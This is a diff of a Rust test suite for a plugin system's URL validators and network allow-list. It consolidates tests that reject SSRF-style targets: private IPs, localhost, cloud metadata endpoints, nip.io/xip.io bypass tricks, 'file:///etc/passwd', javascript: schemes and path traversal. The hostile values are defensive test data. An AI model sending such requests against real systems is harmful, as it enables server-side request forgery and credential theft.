-    fn test_registry_url_validation_blocks_private_networks() {
-        // Block internal network scanning attempts
-        let private_urls = vec![
-            "http://192.168.1.1/evil-repo",
-            "https://192.168.0.254/repo.git",
-            "http://10.0.0.1/internal-repo",
-            "https://10.255.255.255/secret.git",
-            "http://172.16.0.1/admin-repo",
-            "https://172.31.255.255/private.git",
-            "git://192.168.1.100/repo.git",
-        ];
-
-        for url in private_urls {
-            let result = validate_registry_url(url);
-            assert!(result.is_err(), "Should block private network URL: {}", url);
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("Private network") || error.contains("internal network"),
-                "Error should mention private network. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
-    fn test_registry_url_validation_blocks_localhost_access() {
-        // Block localhost/loopback SSRF attempts
-        let localhost_urls = vec![
+            "javascript:alert(1)",
+            "data:text/plain,evil",
             "http://localhost/repo",
-            "https://localhost:8080/git",
-            "http://127.0.0.1/admin",
-            "https://127.0.0.1:3000/secret.git",
-            "http://::1/evil",
-            "git://localhost/repo.git",
+            "http://127.0.0.1/repo",
+            "http://192.168.1.1/repo",
+            "http://169.254.169.254/metadata",
+            "ftp://evil.com/repo",
         ];
 
-        for url in localhost_urls {
-            let result = validate_registry_url(url);
-            assert!(result.is_err(), "Should block localhost URL: {}", url);
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("localhost") || error.contains("loopback"),
-                "Error should mention localhost. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
-    fn test_registry_url_validation_blocks_metadata_services() {
-        // Block cloud metadata service access
-        let metadata_urls = vec![
-            "http://169.254.169.254/latest/meta-data/",
-            "https://169.254.169.254/metadata/instance",
-            "http://169.254.169.254/computeMetadata/v1/",
-            "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
-        ];
-
-        for url in metadata_urls {
+        for url in dangerous_registry_urls {
             let result = validate_registry_url(url);
             assert!(
                 result.is_err(),
-                "Should block metadata service URL: {}",
+                "Dangerous registry URL should be rejected: {}",
                 url
             );
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("metadata service") || error.contains("cloud metadata"),
-                "Error should mention metadata service. Got: {}",
-                error
-            );
         }
-    }
 
-    #[test]
-    fn test_registry_url_validation_blocks_insecure_remote_protocols() {
-        // Block insecure HTTP for remote repositories (HTTPS should be required)
-        let insecure_urls = vec![
-            "http://github.com/user/repo.git",
-            "http://gitlab.com/user/repo.git",
-            "http://bitbucket.org/user/repo.git",
-            "http://example.com/my-registry.git",
+        let safe_registry_urls = vec![
+            "https://github.com/user/repo.git",
+            "git@github.com:user/repo.git",
+            "https://gitlab.com/user/repo.git",
+            "ssh://git@github.com/user/repo.git",
         ];
 
-        for url in insecure_urls {
-            let result = validate_registry_url(url);
-            assert!(result.is_err(), "Should block insecure HTTP URL: {}", url);
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("HTTPS required") || error.contains("insecure"),
-                "Error should mention HTTPS requirement. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
-    fn test_registry_url_validation_allows_legitimate_urls() {
-        // Allow legitimate registry URLs
-        let legitimate_urls = vec![
-            "https://github.com/user/plugin-registry.git",
-            "https://gitlab.com/org/plugins.git",
-            "https://bitbucket.org/team/registry.git",
-            "https://api.github.com/repos/user/registry",
-            "https://my-company.com/internal-registry.git",
-            "ssh://git@github.com/user/registry.git",
-            "git@github.com:user/registry.git",
-            "https://registry.example.org/plugins.git",
-        ];
-
-        for url in legitimate_urls {
+        for url in safe_registry_urls {
             let result = validate_registry_url(url);
             assert!(
                 result.is_ok(),
-                "Should allow legitimate URL: {}. Error: {:?}",
-                url,
-                result
-            );
-            assert_eq!(
-                result.unwrap(),
-                url,
-                "Should return the original URL unchanged"
-            );
-        }
-    }
-
-    #[test]
-    fn test_registry_url_validation_edge_cases() {
-        // Test edge cases and malformed URLs
-        let edge_cases = vec![
-            ("", "Empty URL should be rejected"),
-            ("   ", "Whitespace-only URL should be rejected"),
-            ("not-a-url", "Invalid URL format should be rejected"),
-            ("ftp://example.com/repo", "FTP protocol should be rejected"),
-            (
-                "javascript:alert(1)",
-                "JavaScript scheme should be rejected",
-            ),
-            ("data:text/plain,evil", "Data scheme should be rejected"),
-        ];
-
-        for (url, description) in edge_cases {
-            let result = validate_registry_url(url);
-            assert!(result.is_err(), "{}: {}", description, url);
-        }
-    }
-
-    #[test]
-    fn test_registry_url_validation_allows_development_localhost() {
-        // Special case: Allow localhost only for development with explicit opt-in
-        // This test documents the design decision - we might want to allow localhost
-        // for development scenarios, but require an explicit flag
-
-        // For now, localhost should be blocked (we can revisit this)
-        let dev_urls = vec![
-            "http://localhost:3000/dev-registry",
-            "https://localhost:8443/test-plugins",
-        ];
-
-        for url in dev_urls {
-            let result = validate_registry_url(url);
-            // Currently blocking localhost - this test documents the current behavior
-            assert!(
-                result.is_err(),
-                "Currently blocking localhost for security: {}",
+                "Safe registry URL should be accepted: {}",
                 url
             );
         }
 
-        // TODO: In future, we might want to add a --allow-localhost flag for development
-        // let result = validate_registry_url_with_options("http://localhost:3000/repo", true);
-        // assert!(result.is_ok(), "Should allow localhost with explicit flag");
-    }
-
-    // ========== DENO DEPENDENCY URL SECURITY TESTS ==========
-
-    #[test]
-    fn test_deno_dependency_url_validation_blocks_dangerous_schemes() {
-        // Block dangerous schemes for Deno dependencies
-        let dangerous_urls = vec![
+        // Test dependency URL validation
+        let dangerous_dep_urls = vec![
             "file:///etc/passwd",
-            "file:///c:/windows/system32/malware.ts",
-            "javascript:alert('xss')",
-            "data:text/javascript,alert(1)",
-            "ftp://evil.com/backdoor.ts",
+            "http://deno.land/x/evil", // HTTP not allowed for deps
+            "javascript:evil()",
+            "ftp://evil.com/lib.ts",
+            "http://localhost:8080/lib.ts",
         ];
 
-        for url in dangerous_urls {
+        for url in dangerous_dep_urls {
             let result = validate_deno_dependency_url(url);
             assert!(
                 result.is_err(),
-                "Should block dangerous dependency URL: {}",
+                "Dangerous dependency URL should be rejected: {}",
                 url
             );
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("scheme not allowed") || error.to_lowercase().contains("dangerous"),
-                "Error should mention dangerous scheme. Got: {}",
-                error
-            );
         }
-    }
 
-    #[test]
-    fn test_deno_dependency_url_validation_blocks_private_networks() {
-        // Block internal network access for dependencies
-        let private_urls = vec![
-            "https://192.168.1.100/malicious.ts",
-            "http://10.0.0.5/backdoor.js",
-            "https://172.16.50.1/evil-lib.ts",
-            "http://localhost:8080/internal-api.ts",
-            "https://127.0.0.1:3000/secret.js",
-        ];
-
-        for url in private_urls {
-            let result = validate_deno_dependency_url(url);
-            assert!(
-                result.is_err(),
-                "Should block private network dependency: {}",
-                url
-            );
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("Private network") || error.contains("localhost"),
-                "Error should mention network restriction. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
-    fn test_deno_dependency_url_validation_blocks_metadata_services() {
-        // Block cloud metadata services for dependencies
-        let metadata_urls = vec![
-            "http://169.254.169.254/latest/dynamic/instance-identity/document",
-            "https://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        ];
-
-        for url in metadata_urls {
-            let result = validate_deno_dependency_url(url);
-            assert!(
-                result.is_err(),
-                "Should block metadata service dependency: {}",
-                url
-            );
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("metadata service"),
-                "Error should mention metadata service. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
-    fn test_deno_dependency_url_validation_allows_legitimate_deps() {
-        // Allow legitimate Deno dependency URLs
-        let legitimate_urls = vec![
+        let safe_dep_urls = vec![
             "https://deno.land/x/oak@v12.6.1/mod.ts",
-            "https://deno.land/std@0.204.0/http/server.ts",
             "https://esm.sh/react@18.2.0",
-            "https://cdn.skypack.dev/lodash@4.17.21",
-            "https://unpkg.com/moment@2.29.4/moment.js",
-            "https://cdn.jsdelivr.net/npm/axios@1.5.0/dist/axios.min.js",
+            "https://cdn.skypack.dev/lodash",
             "https://raw.githubusercontent.com/user/repo/main/lib.ts",
-            "https://api.github.com/repos/user/repo/contents/mod.ts",
         ];
 
-        for url in legitimate_urls {
+        for url in safe_dep_urls {
             let result = validate_deno_dependency_url(url);
             assert!(
                 result.is_ok(),
-                "Should allow legitimate dependency: {}. Error: {:?}",
-                url,
-                result
-            );
-            assert_eq!(
-                result.unwrap(),
-                url,
-                "Should return the original URL unchanged"
-            );
-        }
-    }
-
-    #[test]
-    fn test_deno_dependency_url_validation_requires_https_for_remote() {
-        // Require HTTPS for remote dependencies (security best practice)
-        let insecure_urls = vec![
-            "http://deno.land/x/oak/mod.ts",
-            "http://example.com/library.ts",
-            "http://cdn.example.org/module.js",
-        ];
-
-        for url in insecure_urls {
-            let result = validate_deno_dependency_url(url);
-            assert!(
-                result.is_err(),
-                "Should require HTTPS for remote dependency: {}",
+                "Safe dependency URL should be accepted: {}",
                 url
             );
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("HTTPS required"),
-                "Error should mention HTTPS requirement. Got: {}",
-                error
+        }
+    }
+
+    #[test]
+    fn test_domain_normalization() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        // Test case normalization
+        permissions.allow_network("API.GITHUB.COM");
+        permissions.allow_network("api.github.com");
+        permissions.allow_network("Api.GitHub.Com");
+
+        // Should only appear once due to normalization and deduplication
+        assert_eq!(permissions.network.len(), 1);
+        assert_eq!(permissions.network[0], "api.github.com");
+
+        // Test whitespace trimming
+        let mut permissions2 = PluginPermissions::safe_defaults(&project_root);
+        permissions2.allow_network("  registry.npmjs.org  ");
+        permissions2.allow_network("registry.npmjs.org");
+
+        assert_eq!(permissions2.network.len(), 1);
+        assert_eq!(permissions2.network[0], "registry.npmjs.org");
+    }
+
+    #[test]
+    fn test_comprehensive_metadata_service_blocking() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let metadata_services = vec![
+            // AWS
+            "169.254.169.254",
+            "instance-data.ec2.internal",
+            // Google Cloud
+            "100.100.100.200",
+            "metadata.google.internal",
+            // Azure
+            "metadata.azure.com",
+            // Bypass attempts
+            "169.254.169.254.nip.io",
+            "169.254.169.254.xip.io",
+            "169-254-169-254.nip.io",
+            "metadata",
+            "metadata.local",
+            // Case variations (should be normalized and blocked)
+            "METADATA.GOOGLE.INTERNAL",
+            "  169.254.169.254  ", // With whitespace
+        ];
+
+        let initial_count = permissions.network.len();
+
+        for service in metadata_services {
+            permissions.allow_network(service);
+
+            assert_eq!(
+                permissions.network.len(),
+                initial_count,
+                "Metadata service '{}' should be blocked",
+                service
             );
         }
     }
 
     #[test]
-    fn test_deno_dependency_url_validation_edge_cases() {
-        // Test edge cases for dependency URLs
-        let edge_cases = vec![
-            ("", "Empty dependency URL should be rejected"),
-            ("   ", "Whitespace-only dependency URL should be rejected"),
-            (
-                "not-a-url",
-                "Invalid dependency URL format should be rejected",
-            ),
-            (
-                "../../../etc/passwd",
-                "Relative path injection should be rejected",
-            ),
-            (
-                "mailto:admin@example.com",
-                "Email scheme should be rejected",
-            ),
+    fn test_case_insensitive_dangerous_domain_blocking() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let case_variations = vec![
+            "LOCALHOST",
+            "LocalHost",
+            "127.0.0.1",
+            "192.168.1.1",
+            "METADATA.GOOGLE.INTERNAL",
+            "Metadata.Azure.Com",
         ];
 
-        for (url, description) in edge_cases {
-            let result = validate_deno_dependency_url(url);
-            assert!(result.is_err(), "{}: {}", description, url);
+        let initial_count = permissions.network.len();
+
+        for domain in case_variations {
+            permissions.allow_network(domain);
+
+            assert_eq!(
+                permissions.network.len(),
+                initial_count,
+                "Case variation '{}' should be blocked",
+                domain
+            );
         }
     }
 }
